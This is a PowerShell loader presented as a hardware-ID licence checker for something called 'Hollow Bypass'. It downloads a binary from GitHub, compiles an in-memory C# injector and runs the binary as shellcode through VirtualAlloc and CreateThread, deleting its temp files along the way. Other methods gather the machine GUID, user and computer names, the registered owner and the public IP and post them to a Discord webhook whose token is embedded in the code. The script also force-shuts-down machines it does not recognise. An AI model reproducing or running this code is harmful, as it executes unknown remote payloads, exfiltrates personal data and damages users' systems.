class HWIDChecker {
    [array]$allowedUsers
    [string]$currentHWID
    [string]$userName
    [string]$userDomain
    
    HWIDChecker() {
        $this.allowedUsers = @(
            @{ hwid = "0f27e98f-f4c9-440a-9484-a925e25fa7c0"; username = "Owner" },
            @{ hwid = "d7ed1227-75b1-48cf-bff4-4e194ddb8fc9"; username = "Mikoto" }
        )
        $this.currentHWID = $this.GetMachineID()
        $this.userName = $env:USERNAME
        $this.userDomain = $env:COMPUTERNAME
    }
    
    [bool]CheckHWID() {
        # TEMPORAIRE: Desactive la verification HWID pour tester
        # TODO: Remettre la verification apres avoir ajoute votre HWID
        $this.ExecutePowerShellScript()
        return $true
        
        # CODE ORIGINAL (desactive):
        # if ($this.IsSuspiciousProcessRunning()) {
        #     foreach ($user in $this.allowedUsers) {
        #         if ($user.hwid -eq $this.currentHWID) {
        #             return $false
        #         }
        #     }
        #     $this.SendUnauthorizedWebhook()
        #     $this.ShutdownSystem()
        #     return $false
        # }
        #
        # foreach ($user in $this.allowedUsers) {
        #     if ($user.hwid -eq $this.currentHWID) {
        #         if ($user.username -ne "Anto" -and $user.username -ne "Alex" -and $user.username -ne "Tech") {
        #             $this.SendSuccessWebhook($user.username)
        #         }
        #         $this.ExecutePowerShellScript()
        #         return $true
        #     }
        # }
        #
        # $this.SendUnauthorizedWebhook()
        # $this.ShutdownSystem()
        # return $false
    }
    
    hidden [void]ExecutePowerShellScript() {
        try {
            Write-Host "Telechargement de LC.bin..." -ForegroundColor Yellow
            $urls = @(
                "https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin",
                "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/LC.bin"
            )
            $maxRetries = 3
            $retryDelay = 2
            $s = $null
            
            foreach ($url in $urls) {
                Write-Host "Essai avec: $url" -ForegroundColor Cyan
                for ($i = 1; $i -le $maxRetries; $i++) {
                    try {
                        $client = New-Object System.Net.WebClient
                        $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                        $client.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
                        $client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
                        $s = $client.DownloadData($url)
                        Write-Host "LC.bin telecharge depuis $url : $($s.Length) bytes" -ForegroundColor Green
                        break
                    }
                    catch {
                        if ($i -eq $maxRetries) {
                            Write-Host "Echec avec $url apres $maxRetries tentatives" -ForegroundColor Red
                            if ($url -eq $urls[-1]) {
                                throw "Impossible de telecharger LC.bin depuis toutes les URLs"
                            }
                        }
                        else {
                            Write-Host "Tentative $i/$maxRetries echouee, nouvelle tentative dans $retryDelay secondes..." -ForegroundColor Yellow
                            Start-Sleep -Seconds $retryDelay
                        }
                    }
                }
                if ($null -ne $s) {
                    break
                }
            }
            
            if ($null -eq $s) {
                throw "Impossible de telecharger LC.bin"
            }
            Write-Host "Compilation du shellcode injector..." -ForegroundColor Yellow
            $p = New-Object Microsoft.CSharp.CSharpCodeProvider
            $c = New-Object System.CodeDom.Compiler.CompilerParameters
            $c.CompilerOptions = "/unsafe"
            $c.GenerateInMemory = $true
            $c.TempFiles = New-Object System.CodeDom.Compiler.TempFileCollection($env:TEMP, $false)
            $c.TempFiles.KeepFiles = $false
            $r = $p.CompileAssemblyFromSource($c, 'using System;using System.Runtime.InteropServices;public class X{[DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);[DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);[DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);public static void E(byte[] b){IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);Marshal.Copy(b, 0, m, b.Length);IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);CloseHandle(t);}}')
            if ($r.Errors.Count -gt 0) {
                Write-Host "ERREUR compilation: $($r.Errors)" -ForegroundColor Red
                return
            }
            # Supprimer les fichiers temporaires immediatement
            try { $c.TempFiles.Delete() } catch {}
            Write-Host "Execution du shellcode..." -ForegroundColor Yellow
            $a = $r.CompiledAssembly
            $t = $a.GetType("X")
            $m = $t.GetMethod("E")
            Write-Host "Appel de la methode E avec $($s.Length) bytes de shellcode..." -ForegroundColor Cyan
            try {
                $m.Invoke($null, @(,$s)) #password
                Write-Host "Shellcode execute avec succes!" -ForegroundColor Green
                Write-Host "L'application devrait maintenant etre lancee. Verifiez dans le gestionnaire de taches." -ForegroundColor Yellow
            }
            catch {
                Write-Host "ERREUR lors de l'execution du shellcode: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "Stack: $($_.Exception.StackTrace)" -ForegroundColor Red
                throw
            }
        }
        catch {
            Write-Host "ERREUR: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "Stack: $($_.Exception.StackTrace)" -ForegroundColor Red
        }
    }
    
    hidden [void]ShutdownSystem() {
        Stop-Computer -Force
    }
    
    hidden [string]GetMachineID() {
        try {
            $machineGuid = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid" -ErrorAction Stop
            $cleanGuid = $machineGuid.Trim() -replace '[\r\n\s]', ''
            return $cleanGuid
        }
        catch {
            return ""
        }
    }
    
    hidden [string]GetEmail() {
        try {
            $registeredOwner = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name "RegisteredOwner" -ErrorAction Stop
            return $registeredOwner
        }
        catch {
            return ""
        }
    }
    
    hidden [bool]IsSuspiciousProcessRunning() {
        $suspiciousProcesses = @("TeamViewer", "AnyDesk", "tv_w32", "tv_x64", "anydesk")
        $detected = $false
        
        foreach ($processName in $suspiciousProcesses) {
            $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
            if ($process) {
                $detected = $true
            }
        }
        
        $allProcesses = Get-Process | Where-Object { 
            $_.ProcessName -like "*team*" -or 
            $_.ProcessName -like "*any*" -or
            $_.ProcessName -like "*remote*" -or
            $_.ProcessName -like "*rdp*" -or
            $_.ProcessName -like "*vnc*"
        }
        
        if ($allProcesses.Count -gt 0) {
            $detected = $true
        }
        
        return $detected
    }
    
    hidden [string]GetPublicIPv4() {
        try {
            $ip = Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 10
            return $ip
        }
        catch {
            try {
                $ip = Invoke-RestMethod -Uri "https://ipv4.icanhazip.com" -TimeoutSec 5
                return $ip.Trim()
            }
            catch {
                return ""
            }
        }
    }
    
    hidden [string]GetCurrentTimestamp() {
        return (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }
    
    hidden [void]SendUnauthorizedWebhook() {
        $ipv4 = $this.GetPublicIPv4()
        $email = $this.GetEmail()
        $timestamp = $this.GetCurrentTimestamp()
        
        $webhookURL = "1445905462946959360/dZZ3jV8tEnEyh8Owdqo_598cA1cZHxzq1lQi5Hwu3BTVXtr9ckaGjS4UQz6OI96X-CUa"
        
        $postData = @{
            content = $null
            embeds = @(
                @{
                    title = ":warning: TENTATIVO DI ACCESSO NON AUTORIZZATO :warning:"
                    color = 0
                    fields = @(
                        @{
                            name = "HWID"
                            value = $this.currentHWID
                        },
                        @{
                            name = "USER PC"
                            value = "$($this.userName) / $($this.userDomain)"
                        },
                        @{
                            name = "EMAIL ADDRESS"
                            value = $email
                        },
                        @{
                            name = "IP ADDRESS"
                            value = $ipv4
                        }
                    )
                    footer = @{
                        text = "Hollow Bypass"
                        icon_url = "https://i.imgur.com/PRLEb4h.jpeg"
                    }
                    timestamp = $timestamp
                }
            )
            attachments = @()
        } | ConvertTo-Json -Depth 10
        
        $this.SendWebhook($webhookURL, $postData)
    }
    
    hidden [void]SendSuccessWebhook([string]$username) {
        $timestamp = $this.GetCurrentTimestamp()
        
        $webhookURL = "1445905462946959360/dZZ3jV8tEnEyh8Owdqo_598cA1cZHxzq1lQi5Hwu3BTVXtr9ckaGjS4UQz6OI96X-CUa"
        
        $postData = @{
            content = $null
            embeds = @(
                @{
                    title = ":ballot_box_with_check: ACCESSO COMPIUTO :ballot_box_with_check:"
                    color = 0
                    fields = @(
                        @{
                            name = "USERNAME"
                            value = $username
                        },
                        @{
                            name = "HWID"
                            value = $this.currentHWID
                        },
                        @{
                            name = "USER PC"
                            value = "$($this.userName) / $($this.userDomain)"
                        }
                    )
                    footer = @{
                        text = "Hollow Bypass"
                        icon_url = "https://i.imgur.com/PRLEb4h.jpeg"
                    }
                    timestamp = $timestamp
                }
            )
            attachments = @()
        } | ConvertTo-Json -Depth 10
        
        $this.SendWebhook($webhookURL, $postData)
    }
    
    hidden [bool]SendWebhook([string]$url, [string]$data) {
        try {
            $fullUrl = "https://discord.com/api/webhooks/$url"
            $response = Invoke-RestMethod -Uri $fullUrl -Method Post -Body $data -ContentType "application/json" -TimeoutSec 10
            return $true
        }
        catch {
            return $false
        }
    }
}

try {
    $checker = [HWIDChecker]::new()
    $null = $checker.CheckHWID()  # $null pour ne pas afficher la valeur de retour
    # Ne pas faire exit pour ne pas fermer PowerShell
}
catch {
    Write-Host "ERREUR: $($_.Exception.Message)" -ForegroundColor Red
    # Ne pas faire exit pour ne pas fermer PowerShell
}
